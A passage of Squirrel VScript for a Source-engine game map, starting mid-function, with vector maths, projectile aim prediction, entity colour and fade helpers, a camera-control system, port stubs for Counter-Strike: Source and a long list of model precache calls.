	local vertB = ::PL_vadd(orig,::PL_vscale(vecR,distB));local vertC = ::PL_vadd(orig,::PL_vscale(vecL,distC));
	if(distA==1&&distB==1&&distC==1)return Vector(0.0,0.0,0.0);local t1 = ::PL_vsub(vertB,vertA);local t2 = ::PL_vsub(vertB,vertC);
	local norm = t1.Cross(t2);if(::PL_vnull(norm))return norm;norm = ::PL_vnorm(norm);if(::PL_veqd(norm,dir))norm=Vector(-norm.x,-norm.y,-norm.z);return norm;}
	::PL_vadd<-function(v1,v2){return Vector(v1.x+v2.x,v1.y+v2.y,v1.z+v2.z);}::PL_vsub<-function(v1,v2){return Vector(v1.x-v2.x,v1.y-v2.y,v1.z-v2.z);}
	::PL_vscale<-function(v,s){return Vector(v.x*s,v.y*s,v.z*s);}::PL_vdot<-function(v1,v2){return v1.x*v2.x+v1.y*v2.y+v1.z*v2.z;}
	::PL_vnorm<-function(v){return ::PL_vdiv(v,v.Length())}::PL_veqd<-function(v1,v2,d=0.001){return abs(v1.x-v2.x)<d&&abs(v1.y-v2.y)<d&&abs(v1.z-v2.z)<d;}
	::PL_vnull<-function(v){return v.x==0&&v.y==0&&v.z==0;}::PL_vdiv<-function(v,d){return Vector(v.x/d,v.y/d,v.z/d);}
//---------------------------------------------------------------------------------------------------------------------------------^
::PlaneNormalToAngles <- function(dir_forward,plane_normal){		//[returns pitch/yaw/roll vector of forward-dir along plane-normal]
	local left = plane_normal.Cross(dir_forward);
	left.Norm();
	local forward = left.Cross(plane_normal);
	forward.Norm();
	return Vector(((-asin(forward.z))*180/PI),((atan2(forward.y,forward.x))*180/PI),((asin(plane_normal.x*((left.x)*-1)+plane_normal.y*((left.y)*-1)))*180/PI));}
	uaw <- pand;
::TimeDelta<-function(tickrate){return (tickrate+((ceil(tickrate/FrameTime()))*FrameTime()-tickrate));}
::AimPredict<-function(shootpos,shootspeed,targetpos,targetspeed)
{
	local totarget=targetpos-shootpos;
	local a = targetspeed.Dot(targetspeed)-(shootspeed*shootspeed);
	local b = 2*(targetspeed.Dot(totarget));
	local c = totarget.Dot(totarget);
	local p = -b/(2*a);
	local q = (0.00+sqrt((b*b)-4*a*c)/(2*a));	//this becomes "-nan(ind)" if targetspeed is too fast compared to shootspeed
	if(q.tostring()=="-nan(ind)")				//^just work around it with a less-accurate prediction method, should be ok
	{
		local pvel = (fabs(targetspeed.x)+fabs(targetspeed.y)+fabs(targetspeed.z));
		local pdir = Vector(targetspeed.x,targetspeed.y,targetspeed.z);pdir.Norm();
		local dist = ::GetDistance(shootpos,targetpos);
			local disdif = ::GetDistance(targetpos+(pdir*pvel),targetpos);
			if(::GetDistance(targetpos+(pdir*pvel),shootpos)>dist)pvel *= (((dist+disdif)/shootspeed));
			else pvel *= (((dist-disdif)/shootspeed));
				local epos = (targetpos+(pdir*pvel));
				local dir = (epos-shootpos);dir.Norm();
				local ret = {};
				ret.aimdir <- dir;
				ret.aimpos <- epos;
				ret.eta <- ((epos-shootpos).Length()/shootspeed);
				ret.accurate <- false;
				return ret;
	}
	local t1 = p-q;
	local t2 = p+q;
	local t;if(t1>t2&&t2>0)t=t2;else t=t1;
	local aimspot = targetpos+targetspeed*t;
	local dir = (aimspot-shootpos);dir.Norm();
	local ret = {};
	ret.aimdir <- dir;
	ret.aimpos <- aimspot;
	ret.eta <- ((aimspot-shootpos).Length()/shootspeed);
	ret.accurate <- true;
	/*----------------------------------------------------------------------------\\
	/////////////////////////[DEBUG PRINT]\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
	//"q" can bork out^, see: https://gamedev.stackexchange.com/questions/35859/algorithm-to-shoot-at-a-target-in-a-3d-game
	local speed = targetspeed;local eta = ret.eta;
	ScriptPrintMessageCenterAll("[PREDICT]\nA:"+a.tostring()+" / B:"+b.tostring()+" / Q:"+q.tostring()+
	"\n\n[ETA]\n"+eta.tostring()+"\n\n[VELOCITY]\n"+
	speed.x.tointeger().tostring()+"   "+speed.y.tointeger().tostring()+"   "+speed.z.tointeger().tostring()+"\n\n[SPEED]\n"+
	(fabs(speed.x)+fabs(speed.y)+fabs(speed.z)).tointeger().tostring());
	//----------------------------------------------------------------------------*/
	return ret;
}
::ModelscaleToUnits <- function(modelscale,default_length)
{
	if(modelscale<1.00)default_length=default_length*modelscale;
	return ((modelscale*modelscale)*default_length);
}
::UnitsToModelscale <- function(length,default_length)
{
	local modelscale = (length/default_length);
	if(length < default_length)modelscale = (sqrt(length*default_length)/default_length);
	return modelscale;
}
::Chance<-function(amount){if(RandomFloat(0.00,100.00)<=amount)return true;return false;}
//================================================================================================================================\\


::SetScript <- function(handle,script)
{
	if(handle==null || !handle.IsValid())return false;
	if(script!=null&&(typeof script)=="table"){
		handle.ValidateScriptScope();
		local sc = handle.GetScriptScope();
		foreach(v,i in script){sc[v] <- i;}
		if("_Run" in sc)sc._Run();
		if("Run" in sc)sc.Run();}
	return true;
}

::ListNetProps <- function(handle)
{
	function _printprop(send_data,_handle,prop,value)
	{
		local stype = "[SEND]    ";
		if(!send_data)stype = "[DATA]    "
		local ptype = ::NetProps.GetPropType(_handle,prop)
		if(ptype=="table")value = ::NetProps.GetPropString(_handle,prop);
		else if(ptype=="string")value = ::NetProps.GetPropString(_handle,prop);
		else if(ptype=="null")value = ::NetProps.GetPropString(_handle,prop);
		printl(stype + prop + " : " + ptype + " : " + value);
	}
	printl("--------------------------------------------");
	printl("    [::ListNetProps]: " + handle);
	local ntable = {};
	::NetProps.GetTable(handle,0,ntable);
	foreach (k,v in ntable)_printprop(true,handle,k,v);
	ntable = {};
	::NetProps.GetTable(handle,1,ntable);
	foreach (k,v in ntable)_printprop(false,handle,k,v);
	printl("--------------------------------------------");
}

::GetColor <- function(handle) //returns {r,g,b,a}(0-255)
{
	if(handle==null||!handle.IsValid())return {r=255,g=255,b=255,a=255};
	local color = ::NetProps.GetPropInt(handle,"m_clrRender");
	local colortable = {
		r = color & 0xFF,
		g = (color >> 8) & 0xFF,
		b = (color >> 16) & 0xFF,
		a = (color >> 24) & 0xFF,
		tostring = function(){
			return "("+this.r+","+this.g+","+this.b+","+this.a+")";
		},
	};
	return colortable;
}
::SetColor <- function(handle,r=255,g=255,b=255,a=255)
{
	if(handle==null||!handle.IsValid())return;
	local color = (a.tointeger() << 24) | (b.tointeger() << 16) | (g.tointeger() << 8) | r.tointeger();
	::NetProps.SetPropInt(handle,"m_clrRender",color);
	if(a<255&&::NetProps.GetPropInt(handle,"m_nRenderMode")==0)
		::NetProps.SetPropInt(handle,"m_nRenderMode",1);
	else if(a>=255&&::NetProps.GetPropInt(handle,"m_nRenderMode")!=0)
		::NetProps.SetPropInt(handle,"m_nRenderMode",3);
}
::FadeAndKill <- function(target,time=5.00,delay=0.00)	//stringname, handle, [handles]
{
	local targets = [];
	if(typeof(target)=="string")
		for(local h;h=Entities.FindByName(h,target);)
			targets.append(h);
	else if(typeof(target)=="array")
		targets = target;
	else
		targets = [target];
	if(delay<0.00)delay=0.00;
	foreach(tent in targets)
	{
		if(tent==null||!tent.IsValid())continue;
		::NetProps.SetPropBool(tent,"m_bForcePurgeFixedupStrings",true);
		tent.ValidateScriptScope();
		if("_FadeAndKillTick" in tent.GetScriptScope())return;
		local current_alpha = ::GetColor(tent).a;
		tent.GetScriptScope()._fadeandkill_init_rm <- ::NetProps.GetPropInt(tent,"m_nRenderMode");
		tent.GetScriptScope()._fadeandkill_init_a <- current_alpha;
		tent.GetScriptScope()._fadeandkill_cancel <- false;
		tent.GetScriptScope()._fadeandkillamount <- (current_alpha.tofloat()/(time/0.05));
		tent.GetScriptScope()._FadeAndKillTick <- function(){
			local color = ::GetColor(self);
			if(_fadeandkill_cancel)
			{
				::NetProps.SetPropInt(self,"m_nRenderMode",_fadeandkill_init_rm)
				color.a = _fadeandkill_init_a;
				::SetColor(self,color.r,color.g,color.b,color.a);
				delete _fadeandkill_init_rm;
				delete _fadeandkill_init_a;
				delete _fadeandkill_cancel;
				delete _fadeandkillamount;
				delete _FadeAndKillTick;
				return;
			}
			color.a -= _fadeandkillamount;
			if(color.a <= 0)
			{
				EntFireByHandle(self,"Kill","",0.00,null,null);
				return;
			}
			EntFireByHandle(self,"RunScriptCode","_FadeAndKillTick();",0.05,null,null);
			::SetColor(self,color.r,color.g,color.b,color.a);
		};
		::NetProps.SetPropInt(tent,"m_nRenderMode",3);
		EntFireByHandle(tent,"RunScriptCode","_FadeAndKillTick();",delay,null,null);
	}
}
::FadeAndKillCancel <- function(target)		//handle
{
	if(target==null||!target.IsValid())return false;
	target.ValidateScriptScope();
	if("_fadeandkill_cancel" in target.GetScriptScope())
	{
		target.GetScriptScope()._fadeandkill_cancel = true;
		return true;
	}
	return false;
}

::GetActiveWeapon <- function(player){
	if(player==null||!player.IsValid())return null;
	return ::NetProps.GetPropEntity(player,"m_hActiveWeapon");
}
::GetWeaponAmmo <- function(weapon){
	local ammo = [-1,-1];
	if(weapon==null||!weapon.IsValid())return ammo;
	ammo[0] = weapon.Clip1();
	local player = weapon.GetMoveParent();
	if(player==null||!player.IsValid())return ammo;
	ammo[1] = ::NetProps.GetPropIntArray(player,"m_iAmmo",weapon.GetPrimaryAmmoType());
	return ammo;
}
::SetWeaponAmmo <- function(weapon,ammo=null,reserve=null){
	if(weapon==null||!weapon.IsValid())return;
	if(ammo!=null)weapon.SetClip1(ammo);
	if(reserve==null)return;
	local player = weapon.GetMoveParent();
	if(player==null||!player.IsValid())return;
	::NetProps.SetPropIntArray(player,"m_iAmmo",reserve,weapon.GetPrimaryAmmoType());
}

//::DestroyCallback(enthandle,function(){printl("DESTROYED:"+self);});
::DestroyCallback <- function(entity,callback){
	entity.ValidateScriptScope()
	local scope = entity.GetScriptScope()
	scope.setdelegate({}.setdelegate({
			parent   = scope.getdelegate()
			id       = entity.GetScriptId()
			index    = entity.entindex()
			callback = callback
			_get = function(k)return parent[k]
			_delslot = function(k){
				if (k == id){
					entity = EntIndexToHScript(index)
					local scope = entity.GetScriptScope()
					scope.self <- entity
					callback.pcall(scope)
				}
				delete parent[k]
			}
		})
	)
}



//=====================================================================================================================\\
//	::ViewcontrolCreate(name="viewcontrol");	- creates and returns a viewcontrol handle
//	::ViewcontrolClearAll();					- disables viewcontrol for everyone (called on round-start)
//	::ViewcontrolClear(player_viewcontrol);		- disables viewcontrol for player (or all players in viewcontrol-handle)
//	::ViewcontrolSet(player,viewcontrol);		- enables viewcontrol for player (handle/targetname, null disables)
//	::ViewcontrolGet(player);					- returns handle of the active viewcontrol for the player (null:none)
//	::ViewcontrolGetPlayers(viewcontrol);		- returns array of player handles using this viewcontrol handle
//	::ViewcontrolGetAll();						- returns an array of existing viewcontrol handles (except the dummy)
//---------------------------------------------------------------------------------------------------------------------\\
::_viewcontrol_dummy <- null;
::_viewcontrol_handles <- [];
::ViewcontrolClearAll <- function(){//#### must run once every round-start! ####
	for(local h;h=Entities.FindByClassname(h,"player");){::ViewcontrolClear(h);}
}
::ViewcontrolClear <- function(player_viewcontrol){
	if(player_viewcontrol == null || !player_viewcontrol.IsValid())return;
	if(player_viewcontrol.GetClassname()=="player")
	{
		local existing = ::ViewcontrolGet(player_viewcontrol);
		if(existing != null && existing.IsValid()){
			existing.GetScriptScope()._VCdisable(player_viewcontrol);
			return;
		}
		if(::_viewcontrol_dummy == null || !::_viewcontrol_dummy.IsValid())
			::_viewcontrol_dummy = ::ViewcontrolCreate();
		::_viewcontrol_dummy.GetScriptScope()._VCdisable(player_viewcontrol);
	}
	else
	{
		player_viewcontrol.ValidateScriptScope();
		if(!("__viewcontrol" in player_viewcontrol.GetScriptScope()))return;
		foreach(player in player_viewcontrol.GetScriptScope().__players){
			if(player == null || !player.IsValid())continue;
			player_viewcontrol.GetScriptScope()._VCdisable(player);
		}
	}
}
::ViewcontrolSet <- function(player,viewcontrol){
	if(player == null || !player.IsValid())return;
	local vc = null;
	if(typeof(viewcontrol) == "string")
		vc = Entities.FindByName(null,viewcontrol);
	else
		vc = viewcontrol;
	if(vc != null && vc.IsValid()){
		vc.ValidateScriptScope();
		if(!("__viewcontrol" in vc.GetScriptScope()))
			vc = null;
	}
	if(vc == null || !vc.IsValid())
		::ViewcontrolClear(player);
	else{
		local existing = ::ViewcontrolGet(player);
		if(existing != null && existing.IsValid())
			existing.GetScriptScope()._VCdisable(player);
		vc.GetScriptScope()._VCenable(player);
	}
}
::ViewcontrolGet <- function(player){
	if(player == null || !player.IsValid())return null;
	player.ValidateScriptScope();
	if(!("_viewcontrol" in player.GetScriptScope()))
		player.GetScriptScope()._viewcontrol <- null;
	if(player.GetScriptScope()._viewcontrol == null || !player.GetScriptScope()._viewcontrol.IsValid())
		player.GetScriptScope()._viewcontrol = null;
	return player.GetScriptScope()._viewcontrol;
}
::ViewcontrolGetPlayers <- function(viewcontrol){
	local players = [];
	if(viewcontrol == null || !viewcontrol.IsValid())return players;
	viewcontrol.ValidateScriptScope();
	if(!("__viewcontrol" in viewcontrol.GetScriptScope()))return players;
	foreach(player in viewcontrol.GetScriptScope().__players){
		if(player == null || !player.IsValid())continue;
		players.push(player);
	}
	return players;
}
::ViewcontrolGetAll <- function(){
	local cleaned = false;
	local handles = [];
	while(!cleaned){
		cleaned = true;
		for(local i=0;i<::_viewcontrol_handles.len();i++){
			if(::_viewcontrol_handles[i] == null || !::_viewcontrol_handles[i].IsValid()){
				::_viewcontrol_handles.remove(i);
				break;
			}
		}
	}
	foreach(handle in ::_viewcontrol_handles){
		if(handle == ::_viewcontrol_dummy)continue;
		handles.push(handle);
	}
	return handles;
}
::ViewcontrolCreate <- function(name="viewcontrol"){
	local viewcontrol = SpawnEntityFromTable("point_viewcontrol",{targetname=name,classname="viewcontrol",spawnflags=8});
	viewcontrol.SetMoveType(0,0);
	viewcontrol.ValidateScriptScope();
	viewcontrol.GetScriptScope().__viewcontrol <- true;
	viewcontrol.GetScriptScope().__players <- [];
	viewcontrol.GetScriptScope()._VCsetplayer <- function(player,add_remove){
		local idx = -1;
		for(local i=0;i<__players.len();i++){
			if(player == __players[i]){
				idx = i;
				break;
			}
		}
		if(add_remove && idx == -1)
			__players.push(player);
		else if(!add_remove && idx != -1)
			__players.remove(idx);
	}
	viewcontrol.GetScriptScope()._VCenable <- function(player){
			//big creds to ficool for figuring out the  point_viewcontrol bug workarounds here
		local take_damage = ::NetProps.GetPropInt(player, "m_takedamage");
		self.AcceptInput("Enable", "", player, player);
		::NetProps.SetPropInt(player, "m_takedamage", take_damage);
		::NetProps.SetPropInt(player, "m_iDefaultFOV", 150);
		player.SetForceLocalDraw(true);
		player.ValidateScriptScope();
		player.GetScriptScope()._viewcontrol <- self;
		_VCsetplayer(player,true);
		local weapon = ::NetProps.GetPropEntity(player,"m_hActiveWeapon");
		if(weapon != null && weapon.IsValid())
			weapon.EnableDraw();
	};
	viewcontrol.GetScriptScope()._VCdisable <- function(player){
			//big creds to ficool for figuring out the  point_viewcontrol bug workarounds here
		local take_damage = ::NetProps.GetPropInt(player, "m_takedamage");
		local life_state = ::NetProps.GetPropInt(player, "m_lifeState");
		::NetProps.SetPropInt(player, "m_lifeState", 0);
		::NetProps.SetPropEntity(self, "m_hPlayer", player);
		self.AcceptInput("Disable", "", player, player);
		::NetProps.SetPropInt(player, "m_lifeState", life_state);
		::NetProps.SetPropInt(player, "m_takedamage", take_damage);
		::NetProps.SetPropInt(player, "m_iDefaultFOV", 90);
		player.SetForceLocalDraw(false);
		player.ValidateScriptScope();
		player.GetScriptScope()._viewcontrol <- null;
		_VCsetplayer(player,false);
	};
	::DestroyCallback(viewcontrol,function(){
			foreach(player in self.GetScriptScope().__players){
				if(player == null || !player.IsValid())continue;
				self.GetScriptScope()._VCdisable(player);
				::ViewcontrolClear(player);
			}
		});
	::_viewcontrol_handles.push(viewcontrol);
	return viewcontrol;
}
::ViewcontrolClearAll(); //#### must run once every round-start! ####
//=====================================================================================================================\\





//__CSS__ these functions don't exist, create dummy functions and do something properly with it:
function ScriptPrintMessageCenterAll(msg)
{
	//__CSS__ proxy
	ClientPrint(null,4,msg);
}
function ScriptPrintMessageChatTeam(team,msg)
{
	//__CSS__ doesn't seem to be used live
}
function ScriptPrintMessageChatAll(msg)
{
	//__CSS__ proxy
	ClientPrint(null,3,msg);
}


//__CSS__ server say wrapper:        EntFire("server","Command","say xxxxxxxxxx",0.00,null);    now replaced with:    ::ServerSay("say xxxxxxxxxx",0.00,null);
::ServerSay <- function(msg,delay,_dummy)
{
	if(msg.find("say ")!=0)msg = "say " + msg;
	local newmsg = "";
	local ii = 0;
	foreach(i,c in msg)
	{
		ii++;
		if(ii<5)continue;
		newmsg += c.tochar();
	}
	EntFire("manager","RunScriptCode","ClientPrint(null,3,\"\x04"+newmsg+"\");",delay,null);
	//ClientPrint(null,3,"\x04"+newmsg);
}




//__CSS__ precache desperate fix
PrecacheModel("models/luff_frostdrake/luff_frostdrake.mdl");
PrecacheModel("models/luffaren/baguette.mdl");
PrecacheModel("models/luffaren/beamgrid.mdl");
PrecacheModel("models/luffaren/beartrap.mdl");
PrecacheModel("models/luffaren/berserker_sword.mdl");
PrecacheModel("models/luffaren/bhop_steroids.mdl");
PrecacheModel("models/luffaren/billnye.mdl");
PrecacheModel("models/luffaren/billnye_vhs.mdl");
PrecacheModel("models/luffaren/bomb_chuck.mdl");
PrecacheModel("models/luffaren/breakable_gibs.mdl");
PrecacheModel("models/luffaren/captain_planet.mdl");
PrecacheModel("models/luffaren/ck_banana.mdl");
PrecacheModel("models/luffaren/claymore.mdl");
PrecacheModel("models/luffaren/collective_airslide.mdl");
PrecacheModel("models/luffaren/collective_airslidecastle.mdl");
PrecacheModel("models/luffaren/collective_airslidefrost.mdl");
PrecacheModel("models/luffaren/collective_airslidehell.mdl");
PrecacheModel("models/luffaren/collective_airslidenature.mdl");
PrecacheModel("models/luffaren/collective_airslidesilenthill.mdl");
PrecacheModel("models/luffaren/collective_airslidesilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_airslidetemple.mdl");
PrecacheModel("models/luffaren/collective_blockwall.mdl");
PrecacheModel("models/luffaren/collective_blockwallcastle.mdl");
PrecacheModel("models/luffaren/collective_blockwallfactory.mdl");
PrecacheModel("models/luffaren/collective_blockwallfrost.mdl");
PrecacheModel("models/luffaren/collective_blockwallhell.mdl");
PrecacheModel("models/luffaren/collective_blockwallnature.mdl");
PrecacheModel("models/luffaren/collective_blockwallsilenthill.mdl");
PrecacheModel("models/luffaren/collective_blockwallsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_blockwalltemple.mdl");
PrecacheModel("models/luffaren/collective_boostpad.mdl");
PrecacheModel("models/luffaren/collective_boostpadcastle.mdl");
PrecacheModel("models/luffaren/collective_boostpadfactory.mdl");
PrecacheModel("models/luffaren/collective_boostpadfrost.mdl");
PrecacheModel("models/luffaren/collective_boostpadhell.mdl");
PrecacheModel("models/luffaren/collective_boostpadnature.mdl");
PrecacheModel("models/luffaren/collective_boostpadsilenthill.mdl");
PrecacheModel("models/luffaren/collective_boostpadsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_boostpadtemple.mdl");
PrecacheModel("models/luffaren/collective_button.mdl");
PrecacheModel("models/luffaren/collective_buttoncastle.mdl");
PrecacheModel("models/luffaren/collective_buttonfactory.mdl");
PrecacheModel("models/luffaren/collective_buttonfrost.mdl");
PrecacheModel("models/luffaren/collective_buttonhell.mdl");
PrecacheModel("models/luffaren/collective_buttonnature.mdl");
PrecacheModel("models/luffaren/collective_buttonsilenthill.mdl");
PrecacheModel("models/luffaren/collective_buttonsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_buttontemple.mdl");
PrecacheModel("models/luffaren/collective_climb.mdl");
PrecacheModel("models/luffaren/collective_climbcastle.mdl");
PrecacheModel("models/luffaren/collective_climbfactory.mdl");
PrecacheModel("models/luffaren/collective_climbfrost.mdl");
PrecacheModel("models/luffaren/collective_climbhard.mdl");
PrecacheModel("models/luffaren/collective_climbhardcastle.mdl");
PrecacheModel("models/luffaren/collective_climbhardfactory.mdl");
PrecacheModel("models/luffaren/collective_climbhardfrost.mdl");
PrecacheModel("models/luffaren/collective_climbhardhell.mdl");
PrecacheModel("models/luffaren/collective_climbhardnature.mdl");
PrecacheModel("models/luffaren/collective_climbhardsilenthill.mdl");
PrecacheModel("models/luffaren/collective_climbhardsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_climbhardtemple.mdl");
PrecacheModel("models/luffaren/collective_climbhell.mdl");
PrecacheModel("models/luffaren/collective_climbnature.mdl");
PrecacheModel("models/luffaren/collective_climbsilenthill.mdl");
PrecacheModel("models/luffaren/collective_climbsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_climbtemple.mdl");
PrecacheModel("models/luffaren/collective_color.mdl");
PrecacheModel("models/luffaren/collective_crouch.mdl");
PrecacheModel("models/luffaren/collective_crouchcastle.mdl");
PrecacheModel("models/luffaren/collective_crouchfactory.mdl");
PrecacheModel("models/luffaren/collective_crouchfrost.mdl");
PrecacheModel("models/luffaren/collective_crouchhell.mdl");
PrecacheModel("models/luffaren/collective_crouchnature.mdl");
PrecacheModel("models/luffaren/collective_crouchsilenthill.mdl");
PrecacheModel("models/luffaren/collective_crouchsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_crouchtall.mdl");
PrecacheModel("models/luffaren/collective_crouchtallcastle.mdl");
PrecacheModel("models/luffaren/collective_crouchtallfactory.mdl");
PrecacheModel("models/luffaren/collective_crouchtallfrost.mdl");
PrecacheModel("models/luffaren/collective_crouchtallhell.mdl");
PrecacheModel("models/luffaren/collective_crouchtallnature.mdl");
PrecacheModel("models/luffaren/collective_crouchtallsilenthill.mdl");
PrecacheModel("models/luffaren/collective_crouchtallsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_crouchtalltemple.mdl");
PrecacheModel("models/luffaren/collective_crouchtemple.mdl");
PrecacheModel("models/luffaren/collective_detail.mdl");
PrecacheModel("models/luffaren/collective_detail1hell.mdl");
PrecacheModel("models/luffaren/collective_detail1nature.mdl");
PrecacheModel("models/luffaren/collective_detail2nature.mdl");
PrecacheModel("models/luffaren/collective_detail3nature.mdl");
PrecacheModel("models/luffaren/collective_detail4nature.mdl");
PrecacheModel("models/luffaren/collective_detailcastle.mdl");
PrecacheModel("models/luffaren/collective_detailcastle1.mdl");
PrecacheModel("models/luffaren/collective_detailcastle2.mdl");
PrecacheModel("models/luffaren/collective_detailfactory.mdl");
PrecacheModel("models/luffaren/collective_detailfactory1.mdl");
PrecacheModel("models/luffaren/collective_detailfrost.mdl");
PrecacheModel("models/luffaren/collective_detailfrost2.mdl");
PrecacheModel("models/luffaren/collective_detailfrost3.mdl");
PrecacheModel("models/luffaren/collective_detailfrost4.mdl");
PrecacheModel("models/luffaren/collective_detailfrost5.mdl");
PrecacheModel("models/luffaren/collective_detailhell.mdl");
PrecacheModel("models/luffaren/collective_detailnature.mdl");
PrecacheModel("models/luffaren/collective_detailsilenthill.mdl");
PrecacheModel("models/luffaren/collective_detailsilenthill2.mdl");
PrecacheModel("models/luffaren/collective_detailsilenthill2dark.mdl");
PrecacheModel("models/luffaren/collective_detailsilenthill3.mdl");
PrecacheModel("models/luffaren/collective_detailsilenthill3dark.mdl");
PrecacheModel("models/luffaren/collective_detailsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_detailtemple.mdl");
PrecacheModel("models/luffaren/collective_detailtemple1.mdl");
PrecacheModel("models/luffaren/collective_detailtemple2.mdl");
PrecacheModel("models/luffaren/collective_detailtemple3.mdl");
PrecacheModel("models/luffaren/collective_detailtemple4.mdl");
PrecacheModel("models/luffaren/collective_elevator.mdl");
PrecacheModel("models/luffaren/collective_elevatorbig.mdl");
PrecacheModel("models/luffaren/collective_elevatorbigcastle.mdl");
PrecacheModel("models/luffaren/collective_elevatorbigfactory.mdl");
PrecacheModel("models/luffaren/collective_elevatorbigfrost.mdl");
PrecacheModel("models/luffaren/collective_elevatorbighell.mdl");
PrecacheModel("models/luffaren/collective_elevatorbignature.mdl");
PrecacheModel("models/luffaren/collective_elevatorbigsilenthill.mdl");
PrecacheModel("models/luffaren/collective_elevatorbigsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_elevatorbigtemple.mdl");
PrecacheModel("models/luffaren/collective_elevatorcastle.mdl");
PrecacheModel("models/luffaren/collective_elevatorfactory.mdl");
PrecacheModel("models/luffaren/collective_elevatorfrost.mdl");
PrecacheModel("models/luffaren/collective_elevatorhell.mdl");
PrecacheModel("models/luffaren/collective_elevatorhuge.mdl");
PrecacheModel("models/luffaren/collective_elevatorhugecastle.mdl");
PrecacheModel("models/luffaren/collective_elevatorhugefactory.mdl");
PrecacheModel("models/luffaren/collective_elevatorhugefrost.mdl");
PrecacheModel("models/luffaren/collective_elevatorhugehell.mdl");
PrecacheModel("models/luffaren/collective_elevatorhugenature.mdl");
PrecacheModel("models/luffaren/collective_elevatorhugesilenthill.mdl");
PrecacheModel("models/luffaren/collective_elevatorhugesilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_elevatorhugetemple.mdl");
PrecacheModel("models/luffaren/collective_elevatornature.mdl");
PrecacheModel("models/luffaren/collective_elevatorsilenthill.mdl");
PrecacheModel("models/luffaren/collective_elevatorsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_elevatortemple.mdl");
PrecacheModel("models/luffaren/collective_floor.mdl");
PrecacheModel("models/luffaren/collective_floor1nature.mdl");
PrecacheModel("models/luffaren/collective_floor2nature.mdl");
PrecacheModel("models/luffaren/collective_floor3nature.mdl");
PrecacheModel("models/luffaren/collective_floorcastle.mdl");
PrecacheModel("models/luffaren/collective_floorcastle1.mdl");
PrecacheModel("models/luffaren/collective_floorceiling.mdl");
PrecacheModel("models/luffaren/collective_floorceiling1nature.mdl");
PrecacheModel("models/luffaren/collective_floorceiling2nature.mdl");
PrecacheModel("models/luffaren/collective_floorceiling3nature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingcastle.mdl");
PrecacheModel("models/luffaren/collective_floorceilingcastle1.mdl");
PrecacheModel("models/luffaren/collective_floorceilingcastle2.mdl");
PrecacheModel("models/luffaren/collective_floorceilingcastle3.mdl");
PrecacheModel("models/luffaren/collective_floorceilingfactory.mdl");
PrecacheModel("models/luffaren/collective_floorceilingfrost.mdl");
PrecacheModel("models/luffaren/collective_floorceilingfrost2.mdl");
PrecacheModel("models/luffaren/collective_floorceilingfrost3.mdl");
PrecacheModel("models/luffaren/collective_floorceilinghell.mdl");
PrecacheModel("models/luffaren/collective_floorceilingnature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingsilenthill.mdl");
PrecacheModel("models/luffaren/collective_floorceilingsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall1nature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall2nature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall3nature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallcastle.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallcastle1.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallcastle2.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallcastle3.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallfactory.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallfrost.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallfrost2.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallhell.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallnature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallsilenthill.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtallsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtalltemple.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtalltemple1.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slope.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slope1nature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slope2nature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopecastle.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopefactory.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopefrost.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopefrost2.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalf.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalfcastle.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalffactory.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalffrost.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalffrost2.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalfhell.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalfnature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalfsilenthill.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalfsilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehalftemple.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopehell.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopenature.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopesilenthill.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopesilenthilldark.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtall_slopetemple.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtemple.mdl");
PrecacheModel("models/luffaren/collective_floorceilingtemple1.mdl");
PrecacheModel("models/luffaren/collective_floorceiling_slope.mdl");
